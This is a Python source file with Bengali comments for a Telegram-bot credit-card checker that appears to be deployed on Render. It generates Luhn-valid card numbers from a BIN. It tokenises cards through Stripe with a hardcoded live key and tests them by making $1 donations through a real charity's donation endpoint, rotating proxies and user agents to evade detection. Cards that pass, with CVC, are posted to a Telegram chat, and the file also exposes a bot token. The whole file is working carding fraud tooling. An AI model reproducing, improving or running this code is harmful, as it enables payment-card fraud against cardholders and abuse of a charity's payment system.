import requests
import time
import json
import logging
import os
import threading
import telebot
import random
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string

# Flask app for Render (Web Service stability)
app = Flask(__name__)

@app.route('/')
def home():
    return "CC Checker is Running!"

# কনফিগারেশন: লগিং সেটআপ
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("gateway.log"),
        logging.StreamHandler()
    ]
)

# টেলিগ্রাম কনফিগারেশন
TELEGRAM_TOKEN = "8483748146:AAH-Ft5YXtB1okTYt0bp27ovKhkrA3bnGyE"
TELEGRAM_CHAT_ID = "6046372825"

bot = telebot.TeleBot(TELEGRAM_TOKEN)

# User Agents and Proxy List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
]

PROXY_LIST = []

def fetch_proxies():
    """ ProxyScrape থেকে ফ্রিতে প্রক্সি ফেচ করে """
    global PROXY_LIST
    try:
        url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
            if proxies:
                PROXY_LIST = proxies
                logging.info(f"Fetched {len(PROXY_LIST)} proxies.")
    except Exception as e:
        logging.error(f"Failed to fetch proxies: {e}")

def get_random_proxy():
    if not PROXY_LIST:
        fetch_proxies()
    if PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
    return None

def proxy_refresher():
    while True:
        fetch_proxies()
        time.sleep(600)  # Refresh every 10 minutes

# Global control flags
IS_CHECKING = True
IS_BINGEN_ACTIVE = False

def generate_cards(bin_number, count=10, month=None, year=None, cvc=None):
    """ BIN থেকে র্যান্ডম কার্ড জেনারেট করে """
    cards = []
    bin_number = str(bin_number).replace(" ", "")[:6]
    for _ in range(count):
        number = bin_number
        while len(number) < 15:
            number += str(random.randint(0, 9))
        
        # Luhn Algorithm check digit
        digits = [int(d) for d in number]
        for i in range(len(digits) - 1, -1, -2):
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
        total = sum(digits)
        check_digit = (10 - (total % 10)) % 10
        card_num = number + str(check_digit)
        
        c_month = month if month else str(random.randint(1, 12)).zfill(2)
        c_year = year if year else str(random.randint(2025, 2032))
        c_cvc = cvc if cvc else str(random.randint(100, 999))
        
        cards.append(f"{card_num}|{c_month}|{c_year}|{c_cvc}")
    return cards

def send_telegram_msg(message):
    """ টেলিগ্রামে মেসেজ পাঠায় """
    try:
        bot.send_message(TELEGRAM_CHAT_ID, message, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"Telegram Error: {e}")

def create_stripe_payment_method(card_details):
    """ Stripe API ব্যবহার করে PM ID তৈরি করে। """
    stripe_url = "https://api.stripe.com/v1/payment_methods"
    stripe_public_key = "pk_live_51LFRxaD3IeQSSaLaxSFaLLYacZ2NRCw3Kl9GR8rEsC9SpmWIspS6996OAbAyKX5lLX8QU8QKCel7xfB5zZhpqerc0067MXNyR2" 
    
    headers = {
        "Authorization": f"Bearer {stripe_public_key}", 
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "User-Agent": random.choice(USER_AGENTS)
    }
    
    data = {
        "type": "card",
        "card[number]": card_details['number'],
        "card[exp_month]": card_details['month'],
        "card[exp_year]": card_details['year'],
        "card[cvc]": card_details['cvc'],
        "billing_details[email]": card_details.get('email', 'test@example.com'),
        "payment_user_agent": "stripe.js/e00a62b424; stripe-js-v3/e00a62b424; card-element",
        "time_on_page": str(int(time.time() % 100000)),
    }
    
    proxy = get_random_proxy()
    try:
        response = requests.post(stripe_url, headers=headers, data=data, timeout=15, proxies=proxy)
        if response.status_code == 200:
            return response.json().get('id')
        else:
            return None
    except Exception:
        return None

def process_donation(payment_method_id, user_info):
    """ চ্যারিটি সাইটে ডোনেশন সম্পন্ন করে। """
    url = "https://palestinecharity.org/wp-admin/admin-ajax.php"
    headers = {
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://palestinecharity.org",
        "Referer": "https://palestinecharity.org/give/donate-for-us?giveDonationFormInIframe=1",
        "User-Agent": random.choice(USER_AGENTS),
        "X-Requested-With": "XMLHttpRequest",
    }
    payload = {
        "action": "give_process_donation",
        "give-form-id": "66",
        "give-amount": "1.00",
        "give_payment_mode": "stripe",
        "give_stripe_payment_method": payment_method_id,
        "give_first_name": user_info['first_name'],
        "give_last_name": user_info['last_name'],
        "give_email": user_info['email'],
        "give_title": "Mr",
        "give_action": "purchase",
        "give_ajax": "true",
    }

    proxy = get_random_proxy()
    try:
        response = requests.post(url, headers=headers, data=payload, timeout=20, proxies=proxy)
        if "Success" in response.text or response.status_code == 302 or "thank-you" in response.text:
            return "SUCCESS"
        return f"FAILED: {response.text[:50]}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def check_card(card_line):
    """ একটি একক কার্ড চেক করার ফাংশন। """
    global IS_CHECKING
    if not IS_CHECKING:
        return

    card_line = card_line.strip()
    if not card_line or "|" not in card_line:
        return
    
    try:
        parts = card_line.split("|")
        card = {
            "number": parts[0],
            "month": parts[1],
            "year": parts[2],
            "cvc": parts[3],
            "email": f"user_{int(time.time()*100)}@gmail.com"
        }
    except Exception:
        logging.error(f"Invalid format: {card_line}")
        return

    user = {"first_name": "Jhon", "last_name": "Doe", "email": card['email']}
    
    logging.info(f"Checking Card: {card['number']}")
    pm_id = create_stripe_payment_method(card)
    
    if pm_id:
        result = process_donation(pm_id, user)
        if result == "SUCCESS":
            cc_num, cc_mon, cc_year, cc_cvc = parts[0], parts[1], parts[2], parts[3]
            msg = (
                "🔥 *APPROVED - CC HIT!* 🔥\n"
                "━━━━━━━━━━━━━━━━━━\n"
                f"💳 *Card:* `{cc_num}`\n"
                f"📅 *Expiry:* `{cc_mon}/{cc_year}`\n"
                f"🔑 *CVC:* `{cc_cvc}`\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "✅ *Status:* Charged $1.00\n"
                "🌍 *Gateway:* Palestine Charity (Stripe)\n"
                "🤖 *Checked by:* @sbscc_bot\n"
                "━━━━━━━━━━━━━━━━━━"
            )
            logging.info(f"🔥 HIT! -> {card_line}")
            send_telegram_msg(msg)
            with open("hits.txt", "a") as f:
                f.write(f"{card_line} | Status: Success\n")
        else:
            # logging.info(f"❌ DEAD -> {card_line} ({result})") # Muted as per request
            with open("dead.txt", "a") as f:
                f.write(f"{card_line} | Reason: {result}\n")
    else:
        # logging.info(f"❌ STRIPE DEAD -> {card_line}") # Muted as per request
        with open("dead.txt", "a") as f:
            f.write(f"{card_line} | Reason: Stripe Declined\n")

def start_bulk_check(cards_list):
    """ মাল্টি-থ্রেডিং এ চেক শুরু করে। """
    threads = 50  # Increased for faster simultaneous checking
    logging.info(f"Total Cards to check: {len(cards_list)}")
    send_telegram_msg(f"🚀 Checking Started...\nTotal Cards: {len(cards_list)}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_card, cards_list)
        
    logging.info("--- Checking Completed ---")
    send_telegram_msg("🏁 Checking Completed!")

# টেলিগ্রাম বট হ্যান্ডলার
@bot.message_handler(commands=['start'])
def welcome(message):
    welcome_text = (
        "👋 *Welcome to CC Checker Bot!*\n\n"
        "📜 *Available Commands:*\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🔹 `/chk card|mon|year|cvc` - Direct Card Check\n"
        "🔹 `/bin 451101` - Generate 10 Cards from BIN\n"
        "🔹 `/bingen 451101` - Unlimited Auto-Gen & Check\n"
        "🔹 `/stop` - Stop ongoing Processes\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "📥 *Other ways to check:*\n"
        "1️⃣ Send card list directly as a message.\n"
        "2️⃣ Send a `.txt` file with your cards.\n\n"
        "🚀 *System Status: Online & Healthy!*"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # ফাইল থেকে লাইন গুলো পড়া
        content = downloaded_file.decode('utf-8')
        lines = content.split('\n')
        valid_cards = [l.strip() for l in lines if "|" in l]
        
        if valid_cards:
            bot.reply_to(message, f"📥 Received file: `{message.document.file_name}`\nFound {len(valid_cards)} cards. Starting check...")
            threading.Thread(target=start_bulk_check, args=(valid_cards,), daemon=True).start()
        else:
            bot.reply_to(message, "❌ No valid cards found in the file.")
    else:
        bot.reply_to(message, "❌ Please send only `.txt` files.")

@bot.message_handler(commands=['stop'])
def stop_process(message):
    global IS_CHECKING, IS_BINGEN_ACTIVE
    IS_CHECKING = False
    IS_BINGEN_ACTIVE = False
    bot.reply_to(message, "🛑 *Process Stopped Successfully!*", parse_mode="Markdown")

@bot.message_handler(commands=['bin'])
def handle_bin(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Use: `/bin 451101`", parse_mode="Markdown")
            return
        
        bin_num = parts[1]
        cards = generate_cards(bin_num, count=10)
        resp = "🎲 *Generated Cards:*\n\n" + "\n".join([f"`{c}`" for c in cards])
        bot.reply_to(message, resp, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

def bingen_loop(bin_num):
    global IS_CHECKING, IS_BINGEN_ACTIVE
    IS_CHECKING = True
    bot.send_message(TELEGRAM_CHAT_ID, f"🚀 *BinGen Started:* `{bin_num}`\nUnlimited checking active...", parse_mode="Markdown")
    
    while IS_BINGEN_ACTIVE and IS_CHECKING:
        cards = generate_cards(bin_num, count=50)
        start_bulk_check(cards)
        time.sleep(2) # Small delay between batches

@bot.message_handler(commands=['bingen'])
def handle_bingen(message):
    global IS_BINGEN_ACTIVE, IS_CHECKING
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Use: `/bingen 451101`", parse_mode="Markdown")
            return
        
        bin_num = parts[1]
        if IS_BINGEN_ACTIVE:
            bot.reply_to(message, "⚠️ A BinGen process is already running. use `/stop` first.")
            return
            
        IS_BINGEN_ACTIVE = True
        IS_CHECKING = True
        threading.Thread(target=bingen_loop, args=(bin_num,), daemon=True).start()
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['chk'])
def handle_chk(message):
    global IS_CHECKING
    IS_CHECKING = True
    try:
        # Extract cards from command (e.g., "/chk 4111..|11|2025|000")
        input_text = message.text.replace('/chk', '').strip()
        lines = input_text.split('\n')
        valid_cards = [l.strip() for l in lines if "|" in l]
        
        if valid_cards:
            bot.reply_to(message, f"📥 Received {len(valid_cards)} cards via /chk. Starting check...")
            threading.Thread(target=start_bulk_check, args=(valid_cards,), daemon=True).start()
        else:
            bot.reply_to(message, "❌ Invalid format. Use: `/chk number|month|year|cvc`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    global IS_CHECKING
    IS_CHECKING = True # Reset stop flag if new list sent
    lines = message.text.split('\n')
    valid_cards = [l.strip() for l in lines if "|" in l]
    
    if valid_cards:
        bot.reply_to(message, f"📥 Received {len(valid_cards)} cards. Starting check...")
        threading.Thread(target=start_bulk_check, args=(valid_cards,), daemon=True).start()
    else:
        bot.reply_to(message, "❌ Invalid format. Please use: `number|month|year|cvc`")

def run_bot():
    logging.info("Telegram Bot Polling Started...")
    bot.infinity_polling()

@app.route('/health')
def health():
    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>CC Checker | System Status</title>
        <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
        <style>
            :root {
                --primary: #c084fc;
                --secondary: #6366f1;
                --bg: #030712;
                --card-bg: rgba(17, 24, 39, 0.7);
                --text: #f9fafb;
                --success: #22c55e;
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Outfit', sans-serif;
            }

            body {
                background: var(--bg);
                background-image: 
                    radial-gradient(circle at 20% 20%, rgba(99, 102, 241, 0.15) 0%, transparent 40%),
                    radial-gradient(circle at 80% 80%, rgba(192, 132, 252, 0.15) 0%, transparent 40%);
                color: var(--text);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                overflow: hidden;
            }

            .container {
                width: 90%;
                max-width: 800px;
                position: relative;
                z-index: 1;
            }

            .glass-card {
                background: var(--card-bg);
                backdrop-filter: blur(12px);
                -webkit-backdrop-filter: blur(12px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                border-radius: 24px;
                padding: 3rem;
                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
                animation: fadeIn 0.8s ease-out;
            }

            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(20px); }
                to { opacity: 1; transform: translateY(0); }
            }

            .header {
                text-align: center;
                margin-bottom: 3rem;
            }

            .logo-orb {
                width: 80px;
                height: 80px;
                background: linear-gradient(135deg, var(--primary), var(--secondary));
                border-radius: 50%;
                margin: 0 auto 1.5rem;
                display: flex;
                justify-content: center;
                align-items: center;
                font-size: 2rem;
                box-shadow: 0 0 30px rgba(99, 102, 241, 0.4);
                animation: pulse 2s infinite;
            }

            @keyframes pulse {
                0% { box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.4); }
                70% { box-shadow: 0 0 0 20px rgba(99, 102, 241, 0); }
                100% { box-shadow: 0 0 0 0 rgba(99, 102, 241, 0); }
            }

            h1 {
                font-size: 2.5rem;
                font-weight: 800;
                background: linear-gradient(to right, #fff, #9ca3af);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 0.5rem;
            }

            .status-badge {
                display: inline-flex;
                align-items: center;
                gap: 0.5rem;
                background: rgba(34, 197, 94, 0.1);
                color: var(--success);
                padding: 0.5rem 1rem;
                border-radius: 100px;
                font-size: 0.875rem;
                font-weight: 600;
                border: 1px solid rgba(34, 197, 94, 0.2);
            }

            .status-dot {
                width: 8px;
                height: 8px;
                background: var(--success);
                border-radius: 50%;
                box-shadow: 0 0 10px var(--success);
            }

            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 1.5rem;
                margin-top: 2rem;
            }

            .stat-item {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid rgba(255, 255, 255, 0.05);
                padding: 1.5rem;
                border-radius: 16px;
                transition: all 0.3s ease;
            }

            .stat-item:hover {
                background: rgba(255, 255, 255, 0.05);
                transform: translateY(-5px);
                border-color: rgba(255, 255, 255, 0.1);
            }

            .stat-label {
                color: #9ca3af;
                font-size: 0.75rem;
                text-transform: uppercase;
                letter-spacing: 0.1em;
                margin-bottom: 0.5rem;
            }

            .stat-value {
                font-family: 'JetBrains Mono', monospace;
                font-size: 1.25rem;
                font-weight: 600;
                color: var(--primary);
            }

            .footer-info {
                text-align: center;
                margin-top: 3rem;
                color: #6b7280;
                font-size: 0.875rem;
            }

            .floating-blobs {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                overflow: hidden;
                z-index: 0;
            }

            .blob {
                position: absolute;
                background: linear-gradient(135deg, var(--secondary), var(--primary));
                filter: blur(80px);
                border-radius: 50%;
                opacity: 0.2;
                animation: float 20s infinite alternate;
            }

            @keyframes float {
                from { transform: translate(0, 0); }
                to { transform: translate(100px, 100px); }
            }
        </style>
    </head>
    <body>
        <div class="floating-blobs">
            <div class="blob" style="width: 400px; height: 400px; top: -100px; left: -100px;"></div>
            <div class="blob" style="width: 500px; height: 500px; bottom: -200px; right: -200px; animation-delay: -5s;"></div>
        </div>

        <div class="container">
            <div class="glass-card">
                <div class="header">
                    <div class="logo-orb">⚡</div>
                    <h1>System Health</h1>
                    <div class="status-badge">
                        <div class="status-dot"></div>
                        CORE SYSTEMS OPERATIONAL
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-item">
                        <div class="stat-label">Service Name</div>
                        <div class="stat-value">CC Checker Pro</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Response Time</div>
                        <div class="stat-value" id="ping">-- ms</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Bot Status</div>
                        <div class="stat-value">Active Online</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Environment</div>
                        <div class="stat-value">Render Production</div>
                    </div>
                </div>

                <div class="footer-info">
                    &copy; 2026 SBSHEHAB | Advanced Automation Systems
                </div>
            </div>
        </div>

        <script>
            // Simulate dynamic values
            const start = Date.now();
            window.onload = () => {
                const duration = Date.now() - start;
                document.getElementById('ping').innerText = duration + ' ms';
            };
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template)

# বট এবং প্রক্সি রিফ্রেশার থ্রেড শুরু করা (Gunicorn এ সাপোর্ট পাওয়ার জন্য বাইরে রাখা হয়েছে)
threading.Thread(target=run_bot, daemon=True).start()
threading.Thread(target=proxy_refresher, daemon=True).start()

if __name__ == "__main__":
    # পোর্ট কনফিগারেশন
    port = int(os.environ.get("PORT", 5000))
    
    # ইনপুট ফাইল থেকে কার্ড থাকলে অটো চেকিং শুরু করা (ঐচ্ছিক)
    if os.path.exists("cards.txt"):
        with open("cards.txt", "r") as f:
            initial_cards = [l.strip() for l in f.readlines() if "|" in l]
            if initial_cards:
                threading.Thread(target=start_bulk_check, args=(initial_cards,), daemon=True).start()
    
    # Flask সার্ভার রান করা হচ্ছে
    app.run(host='0.0.0.0', port=port)


